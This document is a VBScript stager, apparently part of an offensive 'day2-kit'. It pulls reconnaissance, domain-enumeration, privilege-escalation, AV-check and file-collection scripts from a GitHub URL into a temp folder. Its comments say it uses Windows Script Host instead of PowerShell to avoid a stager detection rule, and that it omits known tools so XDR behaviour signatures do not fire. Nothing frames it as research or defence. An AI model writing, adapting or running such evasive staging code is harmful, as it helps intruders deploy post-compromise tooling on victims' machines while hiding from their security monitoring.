' transfer.vbs - kit fetcher via Windows Script Host (cscript). Stage 1: download only.
' Deliberately NOT PowerShell: avoids the PS network-stager behavior rule entirely.
' Usage:
'   cscript //nologo wsh\transfer.vbs <base-url> [outdir]
'   cscript //nologo wsh\transfer.vbs https://raw.githubusercontent.com/tiaodan577-glitch/day2-kit/main %TEMP%\day2-kit
Option Explicit
Dim base, outDir, fso, shell

If WScript.Arguments.Count < 1 Then
  WScript.Echo "usage: cscript //nologo transfer.vbs <base-url> [outdir]"
  WScript.Quit 1
End If
base = WScript.Arguments(0)
Set shell = CreateObject("WScript.Shell")
If WScript.Arguments.Count >= 2 Then
  outDir = WScript.Arguments(1)
Else
  outDir = shell.ExpandEnvironmentStrings("%TEMP%") & "\day2-kit"
End If

Set fso = CreateObject("Scripting.FileSystemObject")
If Not fso.FolderExists(outDir) Then fso.CreateFolder(outDir)

' Quiet profile: custom/builtin only (known tools omitted on purpose - behavior sigs trip XDR)
Dim files, f, dest, sub1
files = Array( _
  "README-Day2.md", "manifest.sha256", _
  "bat/00-context.bat", "bat/01-sysinfo.bat", "bat/02-net-recon.bat", _
  "bat/03-domain.bat", "bat/04-services.bat", "bat/05-privesc.bat", _
  "bat/06-av-check.bat", "bat/07-schtasks.bat", "bat/99-run-all.bat", _
  "wsh/enum-system.vbs", "wsh/enum-network.js", "wsh/run-all.wsf", "wsh/transfer.vbs", _
  "ps1/Get-LocalRecon.ps1", "ps1/Get-DomainInfo.ps1", "ps1/Get-Files.ps1" )

For Each f In files
  dest = outDir & "\" & Replace(f, "/", "\")
  sub1 = fso.GetParentFolderName(dest)
  If Not fso.FolderExists(sub1) Then
    Dim parts, cur, i
    parts = Split(Replace(f, "/", "\"), "\")
    cur = outDir
    For i = 0 To UBound(parts) - 1
      cur = cur & "\" & parts(i)
      If Not fso.FolderExists(cur) Then fso.CreateFolder(cur)
    Next
  End If
  If Fetch(base & "/" & f, dest) Then
    WScript.Echo "[+] " & f
  Else
    WScript.Echo "[-] " & f
  End If
Next
WScript.Echo "[+] fetched -> " & outDir & "  (run anything in a NEW process)"

Function Fetch(url, dest)
  On Error Resume Next
  Dim http, stream
  Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
  http.setTimeouts 10000, 10000, 30000, 60000
  http.Open "GET", url, False
  http.Send
  If Err.Number <> 0 Or http.Status <> 200 Then
    Fetch = False
    Exit Function
  End If
  Set stream = CreateObject("ADODB.Stream")
  stream.Type = 1
  stream.Open
  stream.Write http.ResponseBody
  stream.SaveToFile dest, 2
  stream.Close
  Fetch = (Err.Number = 0)
End Function
